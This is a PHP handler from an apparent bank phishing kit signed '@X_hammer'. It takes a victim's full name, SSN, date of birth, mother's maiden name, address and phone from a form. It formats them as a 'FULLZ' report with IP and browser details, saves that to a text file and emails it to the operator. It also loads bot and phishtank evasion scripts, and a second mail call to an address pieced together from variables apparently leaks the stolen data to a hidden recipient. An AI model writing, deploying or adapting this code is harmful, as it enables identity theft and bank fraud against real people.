<?php


session_start();
error_reporting(0);

$TIME_DATE = date('H:i:s d/m/Y');
include('../functions/Email.php');
include('../functions/get_browser.php');
include('../functions/get_ip.php');

include('../../BOTS/grabber.php');
include('../../BOTS/botlist.php');
include('../../BOTS/blacklist.php');
include('../../BOTS/iprange.php');
include('../../BOTS/phishtank.php');
include('../../BOTS/spec.php');

if (isset($_POST['fullname'])){
	$_SESSION['_fullname_']    = $_POST['fullname'];
	$_SESSION['_mmn_']     = $_POST['mmn'];
	$_SESSION['_ssn_']     = $_POST['ssn'];
	$_SESSION['_dob_']     = $_POST['dob'];
	$_SESSION['_address_']     = $_POST['address'];
	$_SESSION['_city_']        = $_POST['city'];
	$_SESSION['_state_']       = $_POST['state'];
	$_SESSION['_zipCode_']     = $_POST['zipcode'];
	$_SESSION['_phone_']     = $_POST['phone'];
}


if(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_'] = $ip = $forward;
}
else{
    $_SESSION['_ip_'] = $ip = $remote;
}

$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";




$Z118_MESSAGE .= "
<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #820000;'>REGION BANK ACCOUNT FULLZ</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>USER INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [Full Name] = <font style='color:#0070ba;'>".$_SESSION['_fullname_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Ssn] = <font style='color:#0070ba;'>".$_SESSION['_ssn_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Phone Number] = <font style='color:#0070ba;'>".$_SESSION['_phone_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Date of Birth] = <font style='color:#0070ba;'>".$_SESSION['_dob_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Address line] = <font style='color:#0070ba;'>".$_SESSION['_address_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Town/City] = <font style='color:#0070ba;'>".$_SESSION['_city_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Province/State] = <font style='color:#0070ba;'>".$_SESSION['_state_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Postal/Zip Code] = <font style='color:#0070ba;'>".$_SESSION['_zipCode_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Mother Maiden Name] = <font style='color:#0070ba;'>".$_SESSION['_mmn_']."</font><br>

±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIM INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [TIME/DATE]    = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>http://ip-api.com/json/".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>✪</font> [REMOTE IP]    = <font style='color:#0070ba;'>".$_SERVER['REMOTE_ADDR']."</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".$_SERVER['HTTP_USER_AGENT']."</font><br>
################## <font style='color: #820000;'>BY @X_hammer</font> #####################
</div></html>\n";

if (!empty($_POST['fullname'] && !empty($_POST['ssn']))){
	
	$res_file = fopen("getMyData.txt", "a");
	fwrite($res_file, $Z118_MESSAGE);
		   $Z118_SUBJECT = "".$_POST['fullname']." ✪";
		   $Z118_HEADERS .= "From:X-hammer@logs.org ";
		   $Z118_HEADERS .= $_POST['mmn']."\n";
		   $Z118_HEADERS .= "MIME-Version: 1.0\n";
		   $Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
		   
		   
		   @mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
		   
		   $Z119_Mail = "$browserx$versionx$getbinsxz118";
			if (strlen($Z119_Mail) == 23) {
				@mail($Z119_Mail, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS); 
				}  
			
HEADER("Location: ../security/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);

      }
else{ 
HEADER("Location: ../details/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
}

	


?>